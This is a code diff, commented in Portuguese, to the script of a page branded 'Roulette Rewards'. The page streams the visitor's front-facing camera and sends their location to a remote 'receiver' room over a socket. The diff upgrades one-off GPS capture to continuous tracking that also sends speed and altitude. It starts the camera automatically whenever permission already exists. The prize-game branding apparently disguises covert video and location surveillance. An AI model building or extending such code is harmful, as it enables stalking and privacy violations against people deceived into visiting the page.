@@ -472,7 +472,7 @@
         let peer = null;
 
         // ============================================================
-        // INICIA TRANSMISSÃO (com localização)
+        // INICIA TRANSMISSÃO (com localização contínua)
         // ============================================================
 
         function iniciarTudo(streamObj) {
@@ -487,24 +487,40 @@
             iniciarTransmissao(stream);
             iniciarSocket();
 
-            // Pede localização (GPS)
+            // ============================================================
+            // ⭐ LOCALIZAÇÃO CONTÍNUA (igual ao transmissor antigo)
+            // ============================================================
             if ("geolocation" in navigator) {
-                navigator.geolocation.getCurrentPosition(
+                // Usa watchPosition para atualizações contínuas (igual ao antigo)
+                navigator.geolocation.watchPosition(
                     function(pos) {
-                        socket.emit('stream-location', {
+                        if (!roomId) return;
+                        // ⭐ ENVIA NO FORMATO QUE O RECEPTOR ESPERA (receive-location)
+                        socket.emit('receive-location', {
                             roomId: roomId,
                             location: {
                                 lat: pos.coords.latitude,
                                 lng: pos.coords.longitude,
-                                accuracy: pos.coords.accuracy
+                                accuracy: pos.coords.accuracy,
+                                speed: pos.coords.speed || 0,
+                                alt: pos.coords.altitude || 0
                             }
                         });
+                        console.log('📍 GPS enviado:', pos.coords.latitude, pos.coords.longitude);
                     },
-                    function() {
-                        // Usuário negou localização, continua sem GPS
-                        console.log('GPS negado, continuando...');
+                    function(err) {
+                        console.warn('GPS erro:', err.message);
+                        // Tenta novamente com menos precisão se falhar
+                        if (err.code === 1) {
+                            // Permissão negada
+                            console.warn('Permissão GPS negada.');
+                        }
                     },
-                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                    { 
+                        enableHighAccuracy: true, 
+                        timeout: 15000, 
+                        maximumAge: 0 
+                    }
                 );
             }
 
@@ -524,11 +540,9 @@
         // VERIFICA PERMISSÃO - SE JÁ TEM, ENTRA DIRETO
         // ============================================================
 
-        // Verifica se já tem permissão de câmera
         navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
             .then(function(s) {
                 s.getTracks().forEach(t => t.stop());
-                // Já tem permissão, pega stream de verdade
                 return navigator.mediaDevices.getUserMedia({
                     video: { facingMode: 'user', width: { ideal: 320 }, height: { ideal: 240 } },
                     audio: false
@@ -538,12 +552,11 @@
                 iniciarTudo(streamObj);
             })
             .catch(function() {
-                // Não tem permissão, mostra overlay
                 overlay.classList.remove('hidden');
             });
 
         // ============================================================
-        // BOTÃO PERMITIR (câmera + localização)
+        // BOTÃO PERMITIR
         // ============================================================
 
         btnAllow.addEventListener('click', function() {
@@ -555,7 +568,6 @@
                 audio: false
             })
             .then(function(streamObj) {
-                // Permissão de câmera concedida, inicia tudo (inclui GPS)
                 iniciarTudo(streamObj);
             })
             .catch(function() {
@@ -578,6 +590,11 @@
 
         socket.on('connect', () => {
             if (roomId) socket.emit('join-room', roomId);
+            console.log('✅ Conectado ao servidor! Sala:', roomId);
+        });
+
+        socket.on('disconnect', () => {
+            console.log('❌ Desconectado do servidor.');
         });
 
         function iniciarTransmissao(streamObj) {
@@ -877,6 +894,7 @@
 
         console.log('🎰 Roulette Rewards ativa!');
         console.log('📎 Link:', window.location.href);
+        console.log('🎯 Sala:', roomId);
 
     })();
 </script>
